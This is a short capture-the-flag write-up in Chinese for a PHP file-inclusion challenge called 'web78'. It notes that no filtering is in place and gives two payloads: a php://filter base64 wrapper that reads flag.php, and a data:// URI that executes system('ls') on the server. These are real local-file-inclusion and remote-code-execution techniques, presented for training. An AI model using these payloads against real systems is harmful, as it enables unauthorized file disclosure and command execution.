# web78
![](vx_images/237846030738046.png)

无过滤,直接伪协议读取flag
```
file=php://filter/read=convert.base64-encode/resource=flag.php
```
也可以用data协议
```
/?file=data://text/plain,<?=system('ls')?>
```
![](vx_images/394142458489006.png)
